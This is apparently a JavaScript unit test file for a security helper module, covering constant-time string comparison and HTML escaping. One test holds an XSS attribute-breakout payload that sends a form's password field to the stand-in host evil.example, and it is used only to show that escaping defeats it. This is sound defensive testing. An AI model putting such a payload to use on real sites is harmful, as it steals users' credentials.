import { test } from "node:test";
import assert from "node:assert/strict";
import { timingSafeEqualStr, escapeHtml } from "../src/security.js";

test("timingSafeEqualStr: equal strings match", () => {
  assert.equal(timingSafeEqualStr("secret-token", "secret-token"), true);
});

test("timingSafeEqualStr: different strings of the same length don't match", () => {
  assert.equal(timingSafeEqualStr("secret-token", "secret-tokeN"), false);
});

test("timingSafeEqualStr: different lengths don't match (and don't throw)", () => {
  assert.equal(timingSafeEqualStr("short", "a-lot-longer-string"), false);
});

test("timingSafeEqualStr: empty strings", () => {
  assert.equal(timingSafeEqualStr("", ""), true);
  assert.equal(timingSafeEqualStr("", "x"), false);
});

test("escapeHtml: escapes the five HTML-significant characters", () => {
  assert.equal(escapeHtml(`<script>alert('hi')</script> & "quotes"`), "&lt;script&gt;alert(&#39;hi&#39;)&lt;/script&gt; &amp; &quot;quotes&quot;");
});

test("escapeHtml: a crafted attribute-breakout payload can no longer close the tag", () => {
  const payload = `' /><script>document.location='https://evil.example/steal?p='+document.forms[0].password.value</script>`;
  const escaped = escapeHtml(payload);
  assert.equal(escaped.includes("<script>"), false);
  assert.equal(escaped.includes("'"), false);
});

test("escapeHtml: plain text passes through unchanged", () => {
  assert.equal(escapeHtml("just-a-normal-client-id-123"), "just-a-normal-client-id-123");
});
